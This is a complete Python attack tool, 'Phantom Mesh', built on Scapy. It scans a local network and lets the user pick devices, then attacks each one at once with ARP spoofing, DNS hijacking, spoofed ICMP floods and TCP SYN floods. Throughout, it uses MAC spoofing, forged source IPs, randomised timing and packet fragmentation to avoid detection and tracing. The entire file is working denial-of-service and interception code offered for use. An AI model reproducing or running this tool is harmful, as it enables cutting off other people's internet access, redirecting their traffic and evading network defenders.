#!/usr/bin/env python3
import socket
import threading
import time
import sys
import os
import re
import random
import subprocess
import hashlib
import struct
import logging
from collections import defaultdict

try:
    import scapy.all as scapy
    from scapy.layers.inet import IP, ICMP, UDP, TCP
    from scapy.layers.dns import DNS, DNSRR
    from scapy.layers.dhcp import DHCP, BOOTP
    from scapy.layers.http import HTTP, HTTPRequest
except ImportError:
    print("[-] Scapy not installed. Installing...")
    subprocess.run([sys.executable, "-m", "pip", "install", "scapy", "-q"])
    import scapy.all as scapy

# Suppress Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy").setLevel(logging.ERROR)
scapy.conf.verb = 0


class NetworkKiller:
    def __init__(self):
        self.attacking = False
        self.gateway_ip = ""
        self.gateway_mac = ""
        self.own_ip = ""
        self.own_mac = ""
        self.real_mac = ""  # Store real MAC for restoration
        self.spoofed_mac = ""  # MAC to use for attacks
        self.network = ""
        self.targets = []
        self.selected_targets = []
        self.attack_threads = []
        self.use_mac_spoof = True  # Enable MAC spoofing by default
        self.use_random_delays = True  # Randomize timing
        self.use_vlan_hopping = False  # Try VLAN hopping if available
        self.fragment_packets = True  # Fragment packets to evade IDS
        self.random_source_ips = set()  # Store random IPs for spoofing

    def clear_screen(self):
        """Clear terminal screen."""
        os.system("clear" if os.name == "posix" else "cls")

    def print_banner(self):
        """Print cool banner."""
        self.clear_screen()
        print("""
╔══════════════════════════════════════════════╗
║                                              ║
║            Phantom Mesh -v1.0-               ║
║     Destroy and Cripple Internet Access      ║
║                                              ║
╚══════════════════════════════════════════════╝
        """)

    def auto_detect_network(self):
        """Automatically detect network configuration."""
        print("[*] Auto-detecting network configuration...")
        try:
            # Get own IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            self.own_ip = s.getsockname()[0]
            s.close()

            # Get own MAC
            self.real_mac = scapy.get_if_hwaddr(scapy.conf.iface)
            self.own_mac = self.real_mac

            # Calculate network
            parts = self.own_ip.split(".")
            self.gateway_ip = f"{parts[0]}.{parts[1]}.{parts[2]}.1"
            self.network = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

            print(f"[+] Your IP: {self.own_ip}")
            print(f"[+] Your MAC: {self.own_mac}")
            print(f"[+] Gateway: {self.gateway_ip}")
            print(f"[+] Network: {self.network}")
            return True
        except Exception as e:
            print(f"[-] Detection failed: {e}")
            return False

    def generate_spoofed_mac(self):
        """Generate a realistic spoofed MAC address."""
        # Use vendor prefixes to look legitimate (common vendors)
        vendors = [
            "00:1a:2b",  # Common vendor
            "00:26:5e",  # Common vendor
            "00:50:f2",  # Microsoft
            "08:00:27",  # VirtualBox
            "52:54:00",  # QEMU
        ]
        vendor = random.choice(vendors)
        device = f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
        self.spoofed_mac = f"{vendor}:{device}"
        print(f"[+] Generated spoofed MAC: {self.spoofed_mac}")
        return self.spoofed_mac

    def spoof_interface_mac(self):
        """Attempt to change interface MAC (if permissions allow)."""
        try:
            iface = scapy.conf.iface
            self.generate_spoofed_mac()
            print(f"[*] Attempting to spoof interface MAC...")
            os.system(f"ip link set dev {iface} down 2>/dev/null")
            os.system(f"ip link set dev {iface} address {self.spoofed_mac} 2>/dev/null")
            os.system(f"ip link set dev {iface} up 2>/dev/null")
            time.sleep(0.5)
            print(f"[+] Interface MAC spoofed!")
            return True
        except:
            print("[!] Could not spoof interface MAC, will spoof in packets instead")
            self.generate_spoofed_mac()
            return False

    def generate_random_internal_ips(self, count=5):
        """Generate random IPs from internal network to use as source."""
        parts = self.own_ip.split(".")
        base = f"{parts[0]}.{parts[1]}.{parts[2]}."
        
        for _ in range(count):
            ip = base + str(random.randint(10, 254))
            if ip != self.own_ip and ip != self.gateway_ip:
                self.random_source_ips.add(ip)
        
        print(f"[+] Generated {len(self.random_source_ips)} fake source IPs")

    def get_random_delay(self):
        """Get randomized delay to avoid pattern detection."""
        if self.use_random_delays:
            return random.uniform(0.1, 0.8)
        return 0.5

    def get_gateway_mac(self):
        """Get gateway MAC address automatically."""
        print("\n[*] Discovering gateway MAC address...")
        
        # Method 1: Check ARP cache
        try:
            with open("/proc/net/arp", "r") as f:
                for line in f:
                    if self.gateway_ip in line:
                        parts = line.split()
                        if len(parts) >= 4 and parts[3] != "00:00:00:00:00:00":
                            self.gateway_mac = parts[3]
                            print(f"[+] Gateway MAC (from cache): {self.gateway_mac}")
                            return True
        except:
            pass

        # Method 2: ARP request
        print("[*] Sending ARP request...")
        try:
            arp_request = scapy.ARP(pdst=self.gateway_ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_broadcast = broadcast / arp_request
            answered, _ = scapy.srp(arp_broadcast, timeout=3, verbose=False)
            
            for send, receive in answered:
                self.gateway_mac = receive.hwsrc
                print(f"[+] Gateway MAC (from ARP): {self.gateway_mac}")
                return True
        except:
            pass

        # Method 3: Use fake MAC if detection fails
        print("[!] Using fallback gateway MAC...")
        self.gateway_mac = "ff:ff:ff:ff:ff:ff"
        return True

    def scan_network(self):
        """Scan network for active hosts using multiple methods."""
        print(f"\n[*] Scanning network {self.network}...")
        
        self.targets = []
        
        # Method 1: ARP scan (fastest)
        print("[*] Method 1: ARP scanning (fast)...")
        try:
            arp_request = scapy.ARP(pdst=self.network)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_broadcast = broadcast / arp_request
            
            answered, _ = scapy.srp(arp_broadcast, timeout=2, verbose=False)
            
            for send, receive in answered:
                ip = receive.psrc
                mac = receive.hwsrc
                
                if ip != self.gateway_ip and ip != self.own_ip:
                    self.targets.append({"ip": ip, "mac": mac})
                    print(f"[+] Found: {ip} ({mac})")
        except Exception as e:
            print(f"[!] ARP scan failed: {e}")
        
        # Method 2: Read existing ARP table (instant)
        print("[*] Method 2: Reading system ARP cache...")
        try:
            if os.path.exists("/proc/net/arp"):
                with open("/proc/net/arp", "r") as f:
                    lines = f.readlines()[1:]
                    for line in lines:
                        parts = line.split()
                        if len(parts) >= 4:
                            ip = parts[0]
                            mac = parts[3]
                            
                            # Check if in our network
                            if self.is_in_network(ip) and ip != self.gateway_ip and ip != self.own_ip:
                                if mac != "00:00:00:00:00:00":
                                    # Check if already added
                                    if not any(t["ip"] == ip for t in self.targets):
                                        self.targets.append({"ip": ip, "mac": mac})
                                        print(f"[+] Found: {ip} ({mac})")
        except Exception as e:
            print(f"[!] ARP table read failed: {e}")
        
        # Method 3: Parallel ICMP ping sweep (only if needed and faster)
        if len(self.targets) == 0:
            print("[*] Method 3: Parallel ICMP ping sweep...")
            self.ping_sweep_parallel()
        
        if self.targets:
            print(f"\n[+] Total targets found: {len(self.targets)}")
            return True
        else:
            print("[-] No targets found via automatic scan")
            return self.manual_target_entry()

    def ping_sweep_parallel(self):
        """Fast parallel ICMP ping sweep using threads."""
        parts = self.own_ip.split(".")
        base = f"{parts[0]}.{parts[1]}.{parts[2]}."
        
        def ping_ip(ip_num):
            """Ping a single IP and get MAC if responsive."""
            ip = base + str(ip_num)
            
            try:
                # Quick ping
                pkt = IP(dst=ip, ttl=64)/ICMP(type=8, code=0, id=random.randint(1, 65535))
                result = scapy.sr1(pkt, timeout=0.3, verbose=False)
                
                if result:
                    # Get MAC via ARP
                    arp_req = scapy.ARP(pdst=ip)
                    eth = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
                    arp_pkt = eth/arp_req
                    ans, _ = scapy.srp(arp_pkt, timeout=0.5, verbose=False)
                    
                    mac = "unknown"
                    for send, receive in ans:
                        mac = receive.hwsrc
                    
                    if not any(t["ip"] == ip for t in self.targets):
                        self.targets.append({"ip": ip, "mac": mac})
                        print(f"[+] Found: {ip} ({mac})")
            except:
                pass
        
        # Use thread pool for faster scanning
        threads = []
        for i in range(1, 255):
            if base + str(i) == self.own_ip or base + str(i) == self.gateway_ip:
                continue
            
            t = threading.Thread(target=ping_ip, args=(i,), daemon=True)
            threads.append(t)
            t.start()
            
            # Limit concurrent threads
            if len(threads) >= 50:
                for thread in threads:
                    thread.join(timeout=1)
                threads = []
        
        # Wait for remaining threads
        for thread in threads:
            thread.join(timeout=1)

    def is_in_network(self, ip):
        """Check if IP is in our network."""
        try:
            parts = self.own_ip.split(".")
            network_parts = ip.split(".")
            return parts[0] == network_parts[0] and parts[1] == network_parts[1] and parts[2] == network_parts[2]
        except:
            return False

    def manual_target_entry(self):
        """Allow manual entry of target IPs."""
        print("\n[*] Enter targets manually:")
        print("    Format: IP,MAC or just IP (comma-separated)")
        print("    Example: 192.168.1.5,00:11:22:33:44:55 or 192.168.1.5")
        
        entry = input("[?] Enter target(s): ").strip()
        
        if not entry:
            return False
        
        targets_list = entry.split(",")
        for target in targets_list:
            parts = target.strip().split()
            if len(parts) >= 1:
                ip = parts[0]
                mac = parts[1] if len(parts) > 1 else "unknown"
                
                # Validate IP
                if re.match(r"^(\d+\.){3}\d+$", ip):
                    self.targets.append({"ip": ip, "mac": mac})
                    print(f"[+] Added: {ip} ({mac})")
        
        if self.targets:
            print(f"[+] Total targets: {len(self.targets)}")
            return True
        return False

    def display_targets(self):
        """Display available targets."""
        if not self.targets:
            print("[-] No targets available. Run scan first.")
            return
        
        print("\n" + "="*60)
        print(f"{'#':<3} {'IP Address':<20} {'MAC Address':<25}")
        print("="*60)
        
        for idx, target in enumerate(self.targets):
            print(f"{idx:<3} {target['ip']:<20} {target['mac']:<25}")
        
        print("="*60)

    def select_targets(self):
        """Let user select targets."""
        self.display_targets()
        
        if not self.targets:
            return False
        
        print("\n[*] Select targets to attack:")
        print("    - Enter numbers separated by commas (e.g., 0,1,2)")
        print("    - Enter 'all' to select all targets")
        print("    - Enter 'none' to cancel")
        
        choice = input("\n[?] Selection: ").strip().lower()
        
        if choice == "none":
            return False
        
        self.selected_targets = []
        
        if choice == "all":
            self.selected_targets = self.targets.copy()
        else:
            try:
                indices = [int(x.strip()) for x in choice.split(",")]
                for idx in indices:
                    if 0 <= idx < len(self.targets):
                        self.selected_targets.append(self.targets[idx])
            except:
                print("[-] Invalid input!")
                return False
        
        if not self.selected_targets:
            print("[-] No targets selected!")
            return False
        
        print(f"\n[+] Selected {len(self.selected_targets)} target(s):")
        for target in self.selected_targets:
            print(f"    - {target['ip']} ({target['mac']})")
        
        return True

    def arp_spoof(self, target_ip, target_mac):
        """Advanced ARP spoofing with evasion."""
        # Use spoofed MAC instead of real MAC
        spoof_src_mac = self.spoofed_mac if self.use_mac_spoof else self.own_mac
        
        target_pkt = scapy.ARP(op=2, psrc=self.gateway_ip, hwsrc=spoof_src_mac,
                               pdst=target_ip, hwdst=target_mac)
        gateway_pkt = scapy.ARP(op=2, psrc=target_ip, hwsrc=spoof_src_mac,
                                pdst=self.gateway_ip, hwdst=self.gateway_mac)
        
        count = 0
        while self.attacking:
            try:
                # Randomize intervals to avoid pattern detection
                delay = self.get_random_delay()
                
                # Send at layer 2 to avoid ARP issues
                scapy.send(target_pkt, verbose=0, iface=scapy.conf.iface)
                time.sleep(random.uniform(0.01, 0.1))
                scapy.send(gateway_pkt, verbose=0, iface=scapy.conf.iface)
                
                count += 2
                print(f"\r[+] {target_ip}: ARP packets sent: {count:<6}", end="", flush=True)
                time.sleep(delay)
            except:
                break

    def dns_spoof(self, target_ip):
        """DNS spoofing with randomized responses."""
        request_count = 0
        
        def process_dns(pkt):
            nonlocal request_count
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                try:
                    # Use random response IP from our spoofed pool sometimes
                    response_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                    
                    dns_qr = IP(dst=pkt[IP].src, src=pkt[IP].dst, ttl=random.randint(32, 128)) / \
                             UDP(dport=pkt[UDP].sport, sport=53) / \
                             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                 an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=random.randint(1, 60),
                                          rdata=response_ip))
                    scapy.send(dns_qr, verbose=0, iface=scapy.conf.iface)
                    request_count += 1
                    print(f"\r[+] {target_ip}: DNS hijacked: {request_count}", end="", flush=True)
                except:
                    pass
        
        try:
            while self.attacking:
                try:
                    scapy.sniff(iface=scapy.conf.iface,
                               prn=process_dns,
                               filter=f"udp port 53 and src {target_ip}",
                               store=0, timeout=0.5)  # Reduced timeout for faster stopping
                except KeyboardInterrupt:
                    break
                except:
                    pass
        except:
            pass

    def packet_flood(self, target_ip):
        """Advanced packet flooding with fragmentation and source spoofing."""
        count = 0
        try:
            while self.attacking:
                for _ in range(20):
                    # Randomize source IP to look like multiple devices
                    src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                    
                    pkt = IP(dst=target_ip, src=src_ip, ttl=random.randint(32, 128), 
                            flags=random.choice([0, 1, 2])) / \
                          ICMP(type=8, code=0, seq=random.randint(1, 65535)) / \
                          scapy.Raw(load=os.urandom(random.randint(50, 200)))
                    
                    # Fragment packets if enabled
                    if self.fragment_packets and random.random() > 0.5:
                        scapy.send(pkt, verbose=0, iface=scapy.conf.iface, fragment_size=random.randint(100, 500))
                    else:
                        scapy.send(pkt, verbose=0, iface=scapy.conf.iface)
                    count += 1
                
                print(f"\r[+] {target_ip}: Packets flooded: {count:<6}", end="", flush=True)
                time.sleep(self.get_random_delay())
        except:
            pass

    def syn_flood(self, target_ip):
        """TCP SYN flood attack (harder to trace)."""
        count = 0
        try:
            while self.attacking:
                for _ in range(50):
                    src_ip = random.choice(list(self.random_source_ips)) if self.random_source_ips else self.own_ip
                    src_port = random.randint(1024, 65535)
                    
                    # Random ports to attack
                    target_port = random.choice([80, 443, 22, 21, 25, 3306, 5432])
                    
                    syn_pkt = IP(dst=target_ip, src=src_ip, ttl=random.randint(32, 128)) / \
                             TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000000, 9999999))
                    
                    scapy.send(syn_pkt, verbose=0, iface=scapy.conf.iface)
                    count += 1
                
                print(f"\r[+] {target_ip}: SYN packets sent: {count:<6}", end="", flush=True)
                time.sleep(self.get_random_delay() * 2)
        except:
            pass

    def start_attacks(self):
        """Start all attacks on selected targets."""
        if not self.selected_targets:
            print("[-] No targets selected!")
            return
        
        print("\n" + "="*60)
        print("[*] Initializing stealth attack mode...")
        print("="*60)
        
        # Spoof MAC address
        print("[*] Setting up MAC spoofing...")
        self.spoof_interface_mac()
        
        # Generate random internal IPs for source spoofing
        print("[*] Generating random source IPs...")
        self.generate_random_internal_ips(10)
        
        print("\n" + "="*60)
        print("[!] ATTACK STARTED - Destroying internet access (stealthily)!")
        print("[!] Using spoofed MAC and randomized source IPs")
        print("[!] Attacks: ARP Spoof + DNS Hijack + Packet Flood + SYN Flood")
        print("="*60 + "\n")
        
        self.attacking = True
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        
        for target in self.selected_targets:
            # ARP Spoofing
            t1 = threading.Thread(target=self.arp_spoof,
                                 args=(target['ip'], target['mac']),
                                 daemon=True)
            t1.start()
            self.attack_threads.append(t1)
            time.sleep(0.1)
            
            # DNS Spoofing
            t2 = threading.Thread(target=self.dns_spoof,
                                 args=(target['ip'],),
                                 daemon=True)
            t2.start()
            self.attack_threads.append(t2)
            time.sleep(0.1)
            
            # Packet Flooding
            t3 = threading.Thread(target=self.packet_flood,
                                 args=(target['ip'],),
                                 daemon=True)
            t3.start()
            self.attack_threads.append(t3)
            time.sleep(0.1)
            
            # SYN Flooding (harder to trace)
            t4 = threading.Thread(target=self.syn_flood,
                                 args=(target['ip'],),
                                 daemon=True)
            t4.start()
            self.attack_threads.append(t4)
            time.sleep(0.1)
        
        print("\n\n[+] All attacks running in stealth mode! Press Ctrl+C to stop.")
        try:
            while self.attacking:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attacks()

    def stop_attacks(self):
        """Stop all attacks and restore network."""
        print("\n\n[*] Stopping attacks and cleaning up traces...")
        self.attacking = False
        
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        
        # Restore ARP tables
        print("[*] Restoring ARP tables...")
        try:
            for target in self.selected_targets:
                p1 = scapy.ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac,
                              pdst=target['ip'], hwdst=target['mac'])
                p2 = scapy.ARP(op=2, psrc=target['ip'], hwsrc=target['mac'],
                              pdst=self.gateway_ip, hwdst=self.gateway_mac)
                
                for _ in range(5):
                    scapy.send(p1, verbose=0, iface=scapy.conf.iface)
                    scapy.send(p2, verbose=0, iface=scapy.conf.iface)
        except:
            pass
        
        # Restore MAC address
        print("[*] Restoring original MAC address...")
        try:
            iface = scapy.conf.iface
            os.system(f"ip link set dev {iface} down 2>/dev/null")
            os.system(f"ip link set dev {iface} address {self.real_mac} 2>/dev/null")
            os.system(f"ip link set dev {iface} up 2>/dev/null")
        except:
            pass
        
        print("[+] Network restored! Traces minimized.")

    def run(self):
        """Main loop."""
        if os.geteuid() != 0:
            print("[-] This requires root privileges! Run with: sudo python3 network_killa.py")
            sys.exit(1)
        
        self.print_banner()
        
        # Auto-detect network
        if not self.auto_detect_network():
            print("[-] Failed to detect network!")
            sys.exit(1)
        
        # Get gateway MAC
        if not self.get_gateway_mac():
            print("[-] Failed to get gateway MAC!")
            sys.exit(1)
        
        # Scan network
        if not self.scan_network():
            print("[-] Scan failed!")
            sys.exit(1)
        
        # Select targets
        if not self.select_targets():
            print("[*] No targets selected. Exiting.")
            sys.exit(0)
        
        # Confirm attack
        print("\n[!] WARNING: You are about to disable internet for selected devices!")
        confirm = input("[?] Continue? (yes/no): ").strip().lower()
        
        if confirm != "yes":
            print("[*] Aborted.")
            sys.exit(0)
        
        # Start attacks
        self.start_attacks()


if __name__ == "__main__":
    killer = NetworkKiller()
    killer.run()
